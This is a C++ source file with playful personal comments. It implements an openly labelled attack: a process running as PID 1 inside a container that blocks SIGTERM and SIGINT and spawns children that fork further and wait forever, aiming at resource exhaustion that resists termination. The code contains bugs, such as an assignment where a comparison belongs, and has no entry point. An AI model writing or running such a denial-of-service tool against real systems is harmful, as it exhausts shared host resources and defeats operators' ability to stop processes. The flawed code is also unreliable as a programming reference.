// signal blockers inside PID1 controller
// with notes for myself


//Implementations of 
// Initialize the Attack:

// Create a process that becomes PID 1 inside the container

// Disable or ignore SIGTERM signal handling in PID 1

// Set up a mechanism to spawn child processes exponentially

#include <iostream>
#include <sys/types.h>
#include <unistd.h>
#include <signal.h>
#include <cstdlib>
#include <sys/wait.h>
#include <thread>
#include <chrono>
using namespace std;

//STEP 0
class PID1ctrller{
    private:
    int max;
    int cur_process;
    bool pls_pls_pls_stop;

    public:
    PID1ctrller(int max):
                        max(max),
                        cur_process(1),
                        pls_pls_pls_stop(false){}
    
    void blockSignals(){
        sigset_t sig_set; //imma use ts to keep all my blocker signals
        sigemptyset(&sig_set);

        sigaddset(&sig_set,SIGTERM); //used ts to add the SIGTERM into the set

        // pthread_sigmask(SIG_BLOCK, &sig_set, NULL);
        // above line blocked ts sig
        // never SIG_UNBLOCK this hehehehehe

        if(sigprocmask(SIG_BLOCK,&sig_set, nullptr) == -1){
            perror("NOOOOO why T_T");
            exit(EXIT_FAILURE);
        }

        sigaddset(&sig_set, SIGINT); //to block ctrl+C
        sigprocmask(SIG_BLOCK, &sig_set, nullptr);
    }



    // STEP 1

    pid_t createChild(){
        pid_t cur_born = fork();
        if(cur_born>0){
            cur_process++;
            return cur_born; //pid of child
        }
        else if(cur_born=0){
            init_child_P();
            return 0;
        }
        else{
            perror("you da failureee");
            return -1;
        }
    }
    void init_child_P(){
        // making unkillable zombies yayyyyyyyyyyyyyy

        // usually, ts would be to like kinda
        // pass the terminations of the blocked signals to the child
        // but I want zombies
        // hehehhehe
    }


    // STEP 3

    void spanwer_ahh(int count){
        for(int i = 0; i<count && cur_process < max; i++){
            pid_t child = createChild();
            if (child == 0){
                child_tantrum_behaviour();
                exit(0);
            }
            else if(child == -1){
                break;
            }

            this_thread::sleep_for(chrono::milliseconds(10));
            // holy thread_safe code
            // all this to write sleep(0.01) T_T


        }

    }

    void child_tantrum_behaviour(){
        // if child gets parent;s vlocked signals
        // it will block it asw.

        this_thread::sleep_for(chrono::seconds(2));

        PID1ctrller childcontroller(max);

        childcontroller.cur_process = 1;

        childcontroller.spanwer_ahh(2);

        // Instead of crazyyy spawning
        // i went for exponential growth
        // so as to define it by depth

        while(true){

            pause();
            // heheheh fun part
            // this will wait for the signal
            // but the signal will never come 
            // cause i blocked it
        }

    }


    void Atackkk(){
        cout << "Target max processes =" << max;

        blockSignals();

        spanwer_ahh(3); // 3 started children
        this_thread::sleep_for(chrono::seconds(3));

        // resource exhaustion begins

        while(true){
            this_thread::sleep_for(chrono::seconds(60));
        }




    }


};